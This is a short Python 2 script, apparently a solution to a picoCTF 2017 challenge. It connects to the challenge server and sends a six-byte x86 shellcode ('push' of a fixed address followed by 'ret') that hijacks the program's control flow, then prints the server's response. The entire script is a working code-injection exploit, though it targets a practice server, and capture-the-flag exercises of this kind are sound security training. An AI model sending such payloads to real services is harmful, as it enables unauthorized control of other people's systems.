import socket
import time
a=socket.socket()
a.connect(('shell2017.picoctf.com',58279))
print a.recv(2048)
t = '\x68\x40\x85\x04\x08\xc3'
a.send(t)
time.sleep(2)
print a.recv(2048)
